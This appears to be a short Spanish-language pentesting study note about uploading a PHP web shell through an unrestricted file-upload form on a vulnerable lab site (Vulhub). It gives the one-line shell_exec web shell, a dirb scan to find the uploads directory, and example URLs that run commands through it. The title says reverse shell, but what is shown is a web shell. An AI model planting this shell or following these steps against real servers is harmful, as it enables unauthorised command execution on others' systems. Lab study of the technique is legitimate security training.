### Reverse Shell con php

- Lo ideal es encontrar un sitio web vulnerable (Vulhub)
- El sitio tiene una subida de archivos de cualquier tipo:

En el btn de selección de archivos, subimos el archivo con el código php para la ejecución del código:

```php
<?php
  echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre";
?>
```

Podemos utilizar una herramienta llamada `dirb` para encontrar directorios web

En Kali lo siguiente:

```sh
(root@kali)- [/home/kali/Desktop]
-> dirb http://elsitioweb
...

====> DIRECTORY: http://elsitioweb/uploads/
```

- Copiamos esa ruta... la llevamos a la url
- Ubicamos el archivo malicioso, copiamos el nombre - lo agregamos a la URL
- Nos queda lo siguiente en la URL:

```sh
-> http://elsitioweb/uploads/pwned.php?cmd=whoami
-> http://elsitioweb/uploads/pwned.php?cmd=id
```

Y ya puedo ejecutar comando desde la url.

